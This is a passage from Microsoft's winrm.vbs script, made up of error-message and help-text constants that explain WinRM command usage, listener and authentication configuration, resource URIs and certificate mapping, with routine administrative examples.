'
' Copyright (c) Microsoft Corporation.  All rights reserved.
'
' VBScript Source File
'
' Script Name: winrm.vbs
'



'''''''''''''''''''''
' Error codes
private const ERR_OK              = 0
private const ERR_GENERAL_FAILURE = 1

' Messages
private const L_ONLYCSCRIPT_Message     = "Can be executed only by cscript.exe."
private const L_UNKOPNM_Message         = "Unknown operation name: "
private const L_OP_Message              = "Operation - "
private const L_NOFILE_Message          = "File does not exist: "
private const L_PARZERO_Message         = "Parameter is zero length #"
private const L_INVOPT_ErrorMessage     = "Switch not allowed with the given operation: "
private const L_UNKOPT_ErrorMessage     = "Unknown switch: "
private const L_BLANKOPT_ErrorMessage   = "Missing switch name"
private const L_UNKOPT_GenMessage       = "Invalid use of command line. Type ""winrm -?"" for help."
private const L_HELP_GenMessage         = "Type ""winrm -?"" for help."
private const L_ScriptNameNotFound_ErrorMessage = "Invalid usage of command line; winrm.vbs not found in command string."
private const L_ImproperUseOfQuotes_ErrorMessage = "A quoted parameter value must begin and end with quotes: "
private const L_BADMATCNT1_Message      = "Unexpected match count - one match is expected: "
private const L_OPTNOTUNQ_Message       = "Option is not unique: "
private const L_URIMISSING_Message      = "URI is missing"
private const L_ACTIONMISSING_Message   = "Action is missing"
private const L_URIZERO_Message         = "URI is 0 length"    
private const L_URIZEROTOK_Message      = "Invalid URI, token is 0 length"    
private const L_INVWMIURI1_Message      = "Invalid WMI resource URI - no '/' found  (at least 2 expected)"
private const L_INVWMIURI2_Message      = "Invalid WMI resource URI - only one '/' found (at least 2 expected)"
private const L_NOLASTTOK_Message       = "Invalid URI - cannot locate last token for root node name"
private const L_HashSyntax_ErrorMessage = "Syntax Error: input must be of the form {KEY=""VALUE""[;KEY=""VALUE""]}"
private const L_ARGNOVAL_Message        = "Argument's value is not provided: "
private const L_XMLERROR_Message        = "Unable to parse XML: "
private const L_XSLERROR_Message        = "Unable to parse XSL file. Either it is inaccessible or invalid: "
private const L_MSXML6MISSING_Message   = "Unable to load MSXML6, required by -format option and for set using ""@{...}"""
private const L_FORMATLERROR_Message    = "Invalid option for -format: "
private const L_FORMATFAILED_Message    = "Unable to reformat message. Raw, unformatted, message: "
private const L_PUT_PARAM_NOMATCH_Message = "Parameter name does not match any properties on resource: "
private const L_PUT_PARAM_MULTIMATCH_Message = "Parameter matches more than one property on resource: "
private const L_PUT_PARAM_NOARRAY_Message = "Multiple matching parameter names not allowedin @{...}: "
private const L_PUT_PARAM_NOTATTR_Message = "Parameter matches a non-text property on resource: "
private const L_PUT_PARAM_EMPTY_Message = "Parameter set is empty."
private const L_OPTIONS_PARAMETER_EMPTY_Message = "Options parameter has no value or is malformed."
private const L_RESOURCELOCATOR_Message = "Unable to create ResourceLocator object."
private const L_PUT_PARAM_NOINPUT_Message = "No input provided through ""@{...}"" or ""-file:"" commandline parameters."
private const L_ERR_Message = "Error: "
private const L_ERRNO_Message = "Error number: "
private const L_OpDoesntAcceptInput_ErrorMessage = "Input was supplied to an operation that does not accept input."
private const L_QuickConfigNoChangesNeeded_Message = "WinRM is already set up for remote management on this computer."
private const L_QuickConfig_MissingUpdateXml_0_ErrorMessage = "Could not find update instructions in analysis result."
private const L_QuickConfigUpdated_Message = "WinRM has been updated for remote management."
private const L_QuickConfigUpdateFailed_ErrorMessage = "One or more update steps could not be completed."
private const L_QuickConfig_InvalidBool_0_ErrorMessage = "Could not determine if remoting is enabled."
private const L_QuickConfig_RemotingDisabledbyGP_00_ErrorMessage = "Cannot complete the request due to a conflicting Group Policy setting."
private const L_QuickConfig_UpdatesNeeded_0_Message = "WinRM is not set up to allow remote access to this machine for management."
private const L_QuickConfig_UpdatesNeeded_1_Message = "The following changes must be made:"
private const L_QuickConfig_Prompt_0_Message = "Make these changes [y/n]? "
private const L_QuickConfigNoServiceChangesNeeded_Message = "WinRM is already set up to receive requests on this computer."
private const L_QuickConfigNoServiceChangesNeeded_Message2 = "WinRM service is already running on this machine."
private const L_QuickConfigUpdatedService_Message = "WinRM has been updated to receive requests."
private const L_QuickConfig_ServiceUpdatesNeeded_0_Message = "WinRM is not set up to receive requests on this machine."


'''''''''''''''''''''
' HELP - GENERAL
private const L_Help_Title_0_Message = "Windows Remote Management Command Line Tool"

private const L_Help_Blank_0_Message = ""

private const L_Help_SeeAlso_Title_Message    = "See also:"
private const X_Help_SeeAlso_Aliases_Message  = "  winrm help aliases"
private const X_Help_SeeAlso_Config_Message   = "  winrm help config"
private const X_Help_SeeAlso_CertMapping_Message  = "  winrm help certmapping"
private const X_Help_SeeAlso_CustomRemoteShell_Message    = "  winrm help customremoteshell"
private const X_Help_SeeAlso_Input_Message    = "  winrm help input"
private const X_Help_SeeAlso_Filters_Message  = "  winrm help filters"
private const X_Help_SeeAlso_Switches_Message = "  winrm help switches"
private const X_Help_SeeAlso_Uris_Message     = "  winrm help uris"
private const X_Help_SeeAlso_Auth_Message     = "  winrm help auth"
private const X_Help_SeeAlso_Set_Message      = "  winrm set -?"
private const X_Help_SeeAlso_Create_Message   = "  winrm create -?"
private const X_Help_SeeAlso_Enumerate_Message   = "  winrm enumerate -?"
private const X_Help_SeeAlso_Invoke_Message   = "  winrm invoke -?"
private const X_Help_SeeAlso_Remoting_Message = "  winrm help remoting"
private const X_Help_SeeAlso_configSDDL_Message = "  winrm configsddl -?"


'''''''''''''''''''''
' HELP - HELP
private const L_HelpHelp_000_0_Message = "Windows Remote Management (WinRM) is the Microsoft implementation of "
private const L_HelpHelp_001_0_Message = "the WS-Management protocol which provides a secure way to communicate "
private const L_HelpHelp_001_1_Message = "with local and remote computers using web services.  "
private const L_HelpHelp_002_0_Message = ""
private const L_HelpHelp_003_0_Message = "Usage:"
private const L_HelpHelp_004_0_Message = "  winrm OPERATION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpHelp_005_0_Message = "        [@{KEY=VALUE[;KEY=VALUE]...}]"
private const L_HelpHelp_007_0_Message = ""
private const L_HelpHelp_008_0_Message = "For help on a specific operation:"
private const L_HelpHelp_009_0_Message = "  winrm g[et] -?        Retrieving management information."
private const L_HelpHelp_010_0_Message = "  winrm s[et] -?        Modifying management information."
private const L_HelpHelp_011_0_Message = "  winrm c[reate] -?     Creating new instances of management resources."
private const L_HelpHelp_012_0_Message = "  winrm d[elete] -?     Remove an instance of a management resource."
private const L_HelpHelp_013_0_Message = "  winrm e[numerate] -?  List all instances of a management resource."
private const L_HelpHelp_014_0_Message = "  winrm i[nvoke] -?     Executes a method on a management resource."
private const L_HelpHelp_015_0_Message = "  winrm id[entify] -?   Determines if a WS-Management implementation is"
private const L_HelpHelp_015_1_Message = "                        running on the remote machine."
private const L_HelpHelp_016_0_Message = "  winrm quickconfig -?  Configures this machine to accept WS-Management"
private const L_HelpHelp_016_1_Message = "                        requests from other machines."
private const L_HelpHelp_016_3_Message = "  winrm configSDDL -?   Modify an existing security descriptor for a URI."
private const L_HelpHelp_016_4_Message = "  winrm helpmsg -?      Displays error message for the error code."
private const L_HelpHelp_017_0_Message = ""
private const L_HelpHelp_018_0_Message = "For help on related topics:"
private const L_HelpHelp_019_0_Message = "  winrm help uris       How to construct resource URIs."
private const L_HelpHelp_020_0_Message = "  winrm help aliases    Abbreviations for URIs."
private const L_HelpHelp_021_0_Message = "  winrm help config     Configuring WinRM client and service settings."
private const L_HelpHelp_021_2_Message = "  winrm help certmapping Configuring client certificate access."
private const L_HelpHelp_022_0_Message = "  winrm help remoting   How to access remote machines."
private const L_HelpHelp_023_0_Message = "  winrm help auth       Providing credentials for remote access."
private const L_HelpHelp_024_0_Message = "  winrm help input      Providing input to create, set, and invoke."
private const L_HelpHelp_025_0_Message = "  winrm help switches   Other switches such as formatting, options, etc."
private const L_HelpHelp_026_0_Message = "  winrm help proxy      Providing proxy information."

'''''''''''''''''''''
' HELP - GET
private const L_HelpGet_000_0_Message = "winrm get RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpGet_001_0_Message = ""
private const L_HelpGet_002_0_Message = "Retrieves instances of RESOURCE_URI using specified "
private const L_HelpGet_003_0_Message = "options and key-value pairs."
private const L_HelpGet_004_0_Message = ""
private const L_HelpGet_005_0_Message = "Example: Retrieve current configuration in XML format:"
private const X_HelpGet_006_0_Message = "  winrm get winrm/config -format:pretty"
private const L_HelpGet_007_0_Message = ""
private const L_HelpGet_008_0_Message = "Example: Retrieve spooler instance of Win32_Service class:"
private const X_HelpGet_009_0_Message = "  winrm get wmicimv2/Win32_Service?Name=spooler"
private const L_HelpGet_010_0_Message = ""
private const L_HelpGet_014_0_Message = "Example: Retrieve a certmapping entry on this machine:"
private const X_HelpGet_015_0_Message = "  winrm get winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpGet_016_0_Message = ""

'''''''''''''''''''''
' HELP - SET
private const L_HelpSet_001_0_Message = "winrm set RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpSet_002_0_Message = "          [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpSet_003_0_Message = "          [-file:VALUE]"
private const L_HelpSet_004_0_Message = ""
private const L_HelpSet_005_0_Message = "Modifies settings in RESOURCE_URI using specified switches"
private const L_HelpSet_006_0_Message = "and input of changed values via key-value pairs or updated "
private const L_HelpSet_007_0_Message = "object via an input file."
private const L_HelpSet_008_0_Message = ""
private const L_HelpSet_009_0_Message = "Example: Modify a configuration property of WinRM:"
private const X_HelpSet_010_0_Message = "  winrm set winrm/config @{MaxEnvelopeSizekb=""100""}"
private const L_HelpSet_011_0_Message = ""
private const L_HelpSet_012_0_Message = "Example: Disable a listener on this machine:"
private const X_HelpSet_013_0_Message = "  winrm set winrm/config/Listener?Address=*+Transport=HTTPS @{Enabled=""false""}"
private const L_HelpSet_014_0_Message = ""
private const L_HelpSet_018_0_Message = "Example: Disable a certmapping entry on this machine:"
private const X_HelpSet_019_0_Message = "  Winrm set winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{Enabled=""false""}"
private const L_HelpSet_020_0_Message = ""

'''''''''''''''''''''
' HELP - CREATE
private const L_HelpCreate_001_0_Message = "winrm create RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpCreate_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpCreate_003_0_Message = "             [-file:VALUE]"
private const L_HelpCreate_004_0_Message = ""
private const L_HelpCreate_005_0_Message = "Spawns an instance of RESOURCE_URI using specified "
private const L_HelpCreate_006_0_Message = "key-value pairs or input file."
private const L_HelpCreate_007_0_Message = ""
private const L_HelpCreate_008_0_Message = "Example: Create instance of HTTP Listener on IPv6 address:"
private const X_HelpCreate_009_0_Message = "  winrm create winrm/config/Listener?Address=IP:3ffe:8311:ffff:f2c1::5e61+Transport=HTTP"
private const L_HelpCreate_010_0_Message = ""
private const L_HelpCreate_011_0_Message = "Example: Create instance of HTTPS Listener on all IPs:"
private const X_HelpCreate_012_0_Message = "  winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname=""HOST"";CertificateThumbprint=""XXXXXXXXXX""}"
private const L_HelpCreate_013_0_Message = "Note: XXXXXXXXXX represents a 40-digit hex string; see help config."
private const L_HelpCreate_014_0_Message = ""
private const L_HelpCreate_015_0_Message = "Example: Create a windows shell command instance from xml:"
private const X_HelpCreate_016_0_Message = "  winrm create shell/cmd -file:shell.xml -remote:srv.corp.com"
private const L_HelpCreate_017_0_Message = ""
private const L_HelpCreate_022_0_Message = "Example: Create a CertMapping entry:"
private const X_HelpCreate_023_0_Message = "  winrm create winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/* @{UserName=""USERNAME"";Password=""PASSWORD""} -remote:localhost"
private const L_HelpCreate_024_0_Message = ""


'''''''''''''''''''''
' HELP - DELETE
private const L_HelpDelete_001_0_Message = "winrm delete RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpDelete_002_0_Message = ""
private const L_HelpDelete_003_0_Message = "Removes an instance of RESOURCE_URI."
private const L_HelpDelete_004_0_Message = ""
private const L_HelpDelete_005_0_Message = "Example: delete the HTTP listener on this machine for given IP address:"
private const X_HelpDelete_006_0_Message = "  winrm delete winrm/config/Listener?Address=IP:192.168.2.1+Transport=HTTP"
private const L_HelpDelete_007_0_Message = ""
private const L_HelpDelete_008_0_Message = "Example: delete a certmapping entry:"
private const X_HelpDelete_009_0_Message = "  winrm delete winrm/config/service/certmapping?Issuer=1212131238d84023982e381f20391a2935301923+Subject=*.example.com+URI=wmicimv2/*"
private const L_HelpDelete_010_0_Message = ""

'''''''''''''''''''''
' HELP - ENUMERATE
private const L_HelpEnum_001_0_Message = "winrm enumerate RESOURCE_URI [-ReturnType:Value] [-Shallow]" 
private const L_HelpEnum_001_1_Message = "         [-BasePropertiesOnly] [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpEnum_002_0_Message = ""
private const L_HelpEnum_003_0_Message = "Lists instances of RESOURCE_URI."
private const L_HelpEnum_004_0_Message = "Can limit the instances returned by using a filter and dialect if the "
private const L_HelpEnum_005_0_Message = "resource supports these."
private const L_HelpEnum_006_0_Message = ""
private const L_HelpEnum_006_1_Message = "ReturnType"
private const L_HelpEnum_006_2_Message = "----------"
private const L_HelpEnum_006_3_Message = "returnType is an optional switch that determines the type of data returned."
private const L_HelpEnum_006_4_Message = "Possible options are 'Object', 'EPR'  and 'ObjectAndEPR'. Default is Object"
private const L_HelpEnum_006_5_Message = "If Object is specified or if switch is omitted, then only the objects are"
private const L_HelpEnum_006_6_Message = "returned."
private const L_HelpEnum_006_7_Message = "If EPR is specified, then only the EPRs (End point reference) of the"
private const L_HelpEnum_006_8_Message = "objects are returned. EPRs contain information about the resource URI and"
private const L_HelpEnum_006_9_Message = "selectors for the instance."
private const L_HelpEnum_006_10_Message = "If ObjectAndEPR is specified, then both the object and the associated EPRs"
private const L_HelpEnum_006_11_Message = "are returned."
private const L_HelpEnum_006_12_Message = ""
private const L_HelpEnum_006_13_Message = "Shallow"
private const L_HelpEnum_006_14_Message = "-------"
private const L_HelpEnum_006_15_Message = "Enumerate only instances of the base class specified in the resource URI."
private const L_HelpEnum_006_16_Message = "If this flag is not specified, instances of the base class specified in "
private const L_HelpEnum_006_17_Message = "the resource URI and all its derived classes are returned."
private const L_HelpEnum_006_18_Message = ""
private const L_HelpEnum_006_19_Message = "BasePropertiesOnly"
private const L_HelpEnum_006_20_Message = "------------------"
private const L_HelpEnum_006_21_Message = "Includes only those properties that are part of the base class specified"
private const L_HelpEnum_006_22_Message = "in the resource URI. When -Shallow is specified, this flag has no effect. "
private const L_HelpEnum_006_23_Message = ""
private const L_HelpEnum_007_0_Message = "Example: List all WinRM listeners on this machine:"
private const X_HelpEnum_008_0_Message = "  winrm enumerate winrm/config/Listener"
private const L_HelpEnum_009_0_Message = ""
private const L_HelpEnum_010_0_Message = "Example: List all instances of Win32_Service class:"
private const X_HelpEnum_011_0_Message = "  winrm enumerate wmicimv2/Win32_Service"
private const L_HelpEnum_012_0_Message = ""
'private const L_HelpEnum_013_0_Message = "Example: List all auto start services that are stopped:"
'private const X_HelpEnum_014_0_Message = "  winrm enum wmicimv2/* -filter:""select * from win32_service where StartMode=\""Auto\"" and State = \""Stopped\"" """
'private const L_HelpEnum_015_0_Message = ""
private const L_HelpEnum_016_0_Message = "Example: List all shell instances on a machine:"
private const X_HelpEnum_017_0_Message = "  winrm enum shell/cmd -remote:srv.corp.com"
private const L_HelpEnum_018_0_Message = ""
private const L_HelpEnum_019_0_Message = "Example: List resources accessible to the current user:"
private const X_HelpEnum_020_0_Message = "  winrm enum winrm/config/resource"
private const L_HelpEnum_021_0_Message = ""
private const L_HelpEnum_022_0_Message = "Example: List all certmapping settings:"
private const X_HelpEnum_023_0_Message = "  winrm enum winrm/config/service/certmapping"
private const L_HelpEnum_024_0_Message = ""

'''''''''''''''''''''
' HELP - INVOKE
private const L_HelpInvoke_001_0_Message = "winrm invoke ACTION RESOURCE_URI [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpInvoke_002_0_Message = "             [@{KEY=""VALUE""[;KEY=""VALUE""]}]"
private const L_HelpInvoke_003_0_Message = "             [-file:VALUE]"
private const L_HelpInvoke_004_0_Message = ""
private const L_HelpInvoke_005_0_Message = "Executes method specified by ACTION on target object specified by RESOURCE_URI"
private const L_HelpInvoke_006_0_Message = "with parameters specified by key-value pairs."
private const L_HelpInvoke_007_0_Message = ""
private const L_HelpInvoke_008_0_Message = "Example: Call StartService method on Spooler service:"
private const X_HelpInvoke_009_0_Message = "  winrm invoke StartService wmicimv2/Win32_Service?Name=spooler"
private const L_HelpInvoke_010_0_Message = ""
private const L_HelpInvoke_011_0_Message = "Example: Call StopService method on Spooler service using XML file:"
private const X_HelpInvoke_012_0_Message = "  winrm invoke StopService wmicimv2/Win32_Service?Name=spooler -file:input.xml"
private const L_HelpInvoke_013_0_Message = "Where input.xml:"
private const X_HelpInvoke_014_0_Message = "<p:StopService_INPUT xmlns:p=""http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service""/>"
private const L_HelpInvoke_015_0_Message = ""
private const L_HelpInvoke_016_0_Message = "Example: Call Create method of Win32_Process class with specified parameters:"
private const X_HelpInvoke_017_0_Message = "  winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe"";CurrentDirectory=""C:\""}"
private const L_HelpInvoke_018_0_Message = ""
private const L_HelpInvoke_019_0_Message = "Example: Restore the default winrm configuration:"
private const L_HelpInvoke_019_1_Message = "Note that this will not restore the default winrm plugin configuration:"
private const X_HelpInvoke_020_0_Message = "  winrm invoke restore winrm/config @{}"
private const L_HelpInvoke_021_0_Message = ""
private const L_HelpInvoke_022_0_Message = "Example: Restore the default winrm plugin configuration:"
private const L_HelpInvoke_022_1_Message = "Note that all external plugins will be unregistered during this operation:"
private const X_HelpInvoke_023_0_Message = "  winrm invoke restore winrm/config/plugin @{}"

'''''''''''''''''''''
' HELP - IDENTIFY
private const X_HelpIdentify_001_0_Message = "winrm identify  [-SWITCH:VALUE [-SWITCH:VALUE] ...]"
private const L_HelpIdentify_003_0_Message = ""
private const L_HelpIdentify_004_0_Message = "Issues an operation against a remote machine to see if the WS-Management "
private const L_HelpIdentify_005_0_Message = "service is running. This operation must be run with the '-remote' switch."
private const L_HelpIdentify_006_0_Message = "To run this operation unauthenticated against the remote machine use the"
private const L_HelpIdentify_007_0_Message = "-auth:none"
private const L_HelpIdentify_008_0_Message = ""
private const L_HelpIdentify_009_0_Message = "Example: identify if WS-Management is running on www.example.com:"
private const X_HelpIdentify_010_0_Message = "  winrm identify -remote:www.example.com"


'''''''''''''''''''''
' HELP - HELPMSG
private const X_HelpHelpMessaage_001_0_Message = "winrm helpmsg errorcode"
private const X_HelpHelpMessaage_002_0_Message = ""
private const X_HelpHelpMessaage_003_0_Message = "Displays error message associate with the error code."
private const X_HelpHelpMessaage_004_0_Message = "Example:"
private const X_HelpHelpMessaage_006_0_Message = "  winrm helpmsg 0x5"

'''''''''''''''''''''
' HELP - ALIAS
private const L_HelpAlias_001_0_Message = "Aliasing allows shortcuts to be used in place of full Resource URIs."
private const L_HelpAlias_002_0_Message = "Available aliases and the Resource URIs they substitute for are:"
private const L_HelpAlias_003_0_Message = ""
private const X_HelpAlias_004_0_Message = "wmi      = http://schemas.microsoft.com/wbem/wsman/1/wmi"
private const X_HelpAlias_005_0_Message = "wmicimv2 = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2"
private const X_HelpAlias_006_0_Message = "cimv2    = http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2"
private const X_HelpAlias_007_0_Message = "winrm    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_008_0_Message = "wsman    = http://schemas.microsoft.com/wbem/wsman/1"
private const X_HelpAlias_009_0_Message = "shell    = http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
private const L_HelpAlias_010_0_Message = ""
private const L_HelpAlias_011_0_Message = "Example: using full Resource URI:"
private const x_HelpAlias_012_0_Message = "  winrm get http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpAlias_013_0_Message = ""
private const L_HelpAlias_014_0_Message = "Example: using alias:"
private const X_HelpAlias_015_0_Message = "  winrm get wmicimv2/Win32_Service?Name=WinRM"

'''''''''''''''''''''
' HELP - URIS
private const L_HelpUris_001_0_Message = "Universal Resource Identifiers (URI) specify management resources to be"
private const L_HelpUris_002_0_Message = "used for operations."
private const L_HelpUris_003_0_Message = ""
private const L_HelpUris_004_0_Message = "Selectors and values are passed after the URI in the form:"
private const X_HelpUris_005_0_Message = "  RESOURCE_URI?NAME=VALUE[+NAME=VALUE]..."
private const L_HelpUris_006_0_Message = ""
private const L_HelpUris_007_0_Message = "URIs for all information in WMI are of the following form:"
private const X_HelpUris_008_0_Message = "  WMI path = \\root\NAMESPACE[\NAMESPACE]\CLASS"
private const X_HelpUris_009_0_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const X_HelpUris_010_0_Message = "  ALIAS    = wmi/root/NAMESPACE[/NAMESPACE]/CLASS"
private const L_HelpUris_011_0_Message = ""
private const L_HelpUris_012_0_Message = "Example: Get information about WinRM service from WMI using single selector"
private const X_HelpUris_013_0_Message = "  WMI path = \\root\cimv2\Win32_Service"
private const X_HelpUris_013_1_Message = "  URI      = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service?Name=WinRM"
private const X_HelpUris_014_0_Message = "  ALIAS    = wmi/root/cimv2/Win32_Service?Name=WinRM"
private const L_HelpUris_015_0_Message = ""
private const L_HelpUris_015_1_Message = "When enumerating WMI instances using a WQL filter,"
private const L_HelpUris_015_2_Message = "the CLASS must be ""*"" (star) and no selectors should be specified."
private const L_HelpUris_015_3_Message = "Example:"
private const X_HelpUris_015_4_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/*"
private const L_HelpUris_015_5_Message = ""
private const L_HelpUris_015_6_Message = "When accesing WMI singleton instances, no selectors should be specified."
private const L_HelpUris_015_7_Message = "Example:"
private const X_HelpUris_015_8_Message = "URI = http://schemas.microsoft.com/wbem/wsman/1/wmi/root/cimv2/Win32_Service"
private const L_HelpUris_015_9_Message = ""
private const L_HelpUris_016_0_Message = "Note: Some parts of RESOURCE_URI may be case-sensitive. When using create or"
private const L_HelpUris_017_0_Message = "invoke, the last part of the resource URI must match case-wise the top-level"
private const L_HelpUris_018_0_Message = "element of the expected XML."

'''''''''''''''''''''
' HELP - CONFIG
private const L_HelpConfig_001_0_Message = "Configuration for WinRM is managed using the winrm command line or through GPO."
private const L_HelpConfig_002_0_Message = "Configuration includes global configuration for both the client and service."
private const L_HelpConfig_003_0_Message = ""
private const L_HelpConfig_004_0_Message = "The WinRM service requires at least one listener to indicate the IP address(es)"
private const L_HelpConfig_005_0_Message = "on which to accept WS-Management requests.  For example, if the machine has "
private const L_HelpConfig_006_0_Message = "multiple network cards, WinRM can be configured to only accept requests from"
private const L_HelpConfig_007_0_Message = "one of the network cards."
private const L_HelpConfig_008_0_Message = ""
private const L_HelpConfig_009_0_Message = "Global configuration"
private const X_HelpConfig_010_0_Message = "  winrm get winrm/config"
private const X_HelpConfig_011_0_Message = "  winrm get winrm/config/client"
private const X_HelpConfig_012_0_Message = "  winrm get winrm/config/service"
private const X_HelpConfig_012_1_Message = "  winrm enumerate winrm/config/resource"
private const X_HelpConfig_012_2_Message = "  winrm enumerate winrm/config/listener"
private const X_HelpConfig_012_3_Message = "  winrm enumerate winrm/config/plugin"
private const X_HelpConfig_012_4_Message = "  winrm enumerate winrm/config/service/certmapping"
private const L_HelpConfig_013_0_Message = ""
private const L_HelpConfig_014_0_Message = "Network listening requires one or more listeners.  "
private const L_HelpConfig_015_0_Message = "Listeners are identified by two selectors: Address and Transport."

private const L_HelpConfigAddress_001_0_Message = "Address must be one of:"
private const L_HelpConfigAddress_002_0_Message = "  *           - Listen on all IPs on the machine "
private const L_HelpConfigAddress_003_0_Message = "  IP:1.2.3.4  - Listen only on the specified IP address"
private const L_HelpConfigAddress_004_0_Message = "  MAC:...     - Listen only on IP address for the specified MAC"
private const L_HelpConfigAddress_005_0_Message = ""
private const L_HelpConfigAddress_006_0_Message = "Note: All listening is subject to the IPv4Filter and IPv6Filter under    "
private const L_HelpConfigAddress_007_0_Message = "config/service."
private const L_HelpConfigAddress_008_0_Message = "Note: IP may be an IPv4 or IPv6 address."

private const L_HelpConfigTransport_001_0_Message = "Transport must be one of:"
private const L_HelpConfigTransport_002_0_Message = "  HTTP  - Listen for requests on HTTP  (default port is 5985)"
private const L_HelpConfigTransport_003_0_Message = "  HTTPS - Listen for requests on HTTPS (default port is 5986)"
private const L_HelpConfigTransport_004_0_Message = ""
private const L_HelpConfigTransport_005_0_Message = "Note: HTTP traffic by default only allows messages encrypted with "
private const L_HelpConfigTransport_006_0_Message = "the Negotiate or Kerberos SSP."
private const L_HelpConfigTransport_007_0_Message = ""
private const L_HelpConfigTransport_008_0_Message = ""
private const L_HelpConfigTransport_009_0_Message = "When configuring HTTPS, the following properties are used:"
private const L_HelpConfigTransport_010_0_Message = "  Hostname - Name of this machine; must match CN in certificate."
private const L_HelpConfigTransport_011_0_Message = "  CertificateThumbprint - hexadecimal thumbprint of certificate appropriate for"
private const L_HelpConfigTransport_012_0_Message = "    Server Authentication."
private const L_HelpConfigTransport_013_0_Message = "Note: If only Hostname is supplied, WinRM will try to find an appropriate"
private const L_HelpConfigTransport_014_0_Message = "certificate."
   
private const L_HelpConfigExamples_001_0_Message = "Example: To listen for requests on HTTP on all IPs on the machine:"
private const X_HelpConfigExamples_002_0_Message = "  winrm create winrm/config/listener?Address=*+Transport=HTTP"
private const L_HelpConfigExamples_003_0_Message = ""
private const L_HelpConfigExamples_004_0_Message = "Example: To disable a given listener"
private const X_HelpConfigExamples_005_0_Message = "  winrm set winrm/config/listener?Address=IP:1.2.3.4+Transport=HTTP @{Enabled=""false""}"
private const L_HelpConfigExamples_006_0_Message = ""
private const L_HelpConfigExamples_007_0_Message = "Example: To enable basic authentication on the client but not the service:"
private const X_HelpConfigExamples_008_0_Message = "  winrm set winrm/config/client/auth @{Basic=""true""}"
private const L_HelpConfigExamples_009_0_Message = ""
private const L_HelpConfigExamples_010_0_Message = "Example: To enable Negotiate for all workgroup machines."
private const X_HelpConfigExamples_011_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""<local>""}"
private const L_HelpConfigExamples_012_0_Message = ""
private const L_HelpConfigExamples_013_0_Message = "Example: To add an IPv4 and IPv6 host address to TrustedHosts."
private const X_HelpConfigExamples_014_0_Message = "  winrm set winrm/config/client @{TrustedHosts=""1.2.3.4,[1:2:3::8]""}"
private const L_HelpConfigExamples_015_0_Message = ""
private const L_HelpConfigExamples_016_0_Message = "  Note: Computers in the TrustedHosts list might not be authenticated"

'''''''''''''''''''''
' HELP - CertMapping
private const L_HelpCertMapping_001_0_Message = "Certificate mapping remote access to WinRM using client certificates is "
private const L_HelpCertMapping_002_0_Message = "stored in the certificate mapping table identified by the "
private const L_HelpCertMapping_003_0_Message = "following resource URI:"
private const L_HelpCertMapping_003_1_Message = ""
private const L_HelpCertMapping_004_0_Message = " winrm/config/service/CertMapping"
private const L_HelpCertMapping_005_0_Message = ""
private const L_HelpCertMapping_006_0_Message = "Each entry in this table contains five properties:"
private const L_HelpCertMapping_007_0_Message = " Issuer -  Thumbprint of the issuer certificate."
private const L_HelpCertMapping_008_0_Message = " Subject - Subject field of client certificate."
private const L_HelpCertMapping_009_0_Message = " URI - The URI or URI prefix for which this mapping applies."
private const L_HelpCertMapping_009_1_Message = " Username - Local username for processing the request."
private const L_HelpCertMapping_009_2_Message = " Password - Local password for processing the request."
private const L_HelpCertMapping_009_3_Message = " Enabled - Use in processing if true."
private const L_HelpCertMapping_010_0_Message = "  "
private const L_HelpCertMapping_011_0_Message = "For a client certificate to be applicable, the issuer certificate must be  "
private const L_HelpCertMapping_012_0_Message = "available locally and match the thumbprint in the entry Issuer property"
private const L_HelpCertMapping_012_1_Message = ""
private const L_HelpCertMapping_012_2_Message = "For a client certificate to be applicable, its DNS or Principal name "
private const L_HelpCertMapping_013_0_Message = "(from the SubjectAlternativeName field) must match the Subject property."
private const L_HelpCertMapping_014_0_Message = "The value can start with a '*' wildcard."
private const L_HelpCertMapping_014_1_Message = "The URI identifies for which resources the indicated client certificates ."
private const L_HelpCertMapping_014_2_Message = "should be mapped."
private const L_HelpCertMapping_014_3_Message = "The value can end with a '*' wildcard."
private const L_HelpCertMapping_014_4_Message = ""

private const L_HelpCertMapping_015_0_Message = "If the client certificate matches the entry and it is enabled, the "
private const L_HelpCertMapping_016_0_Message = "request is processed under the local account with the given username "

private const L_HelpCertMapping_017_0_Message = "and password after ensuring that user has access to the resource as "
private const L_HelpCertMapping_018_0_Message = "defined by the URI security table."
private const L_HelpCertMapping_019_0_Message = ""

private const L_HelpCertMapping_020_0_Message = "When creating a new entry or changing the password of an existing entry, "
private const L_HelpCertMapping_021_0_Message = "the -r switch must be used since the WinRM service must store the password"
private const L_HelpCertMapping_022_0_Message = "for future use."


private const L_HelpCertMappingExamples_001_0_Message = "Example: To see the current CertMapping configuration"
private const X_HelpCertMappingExamples_002_0_Message = "  winrm enumerate winrm/config/service/CertMapping"

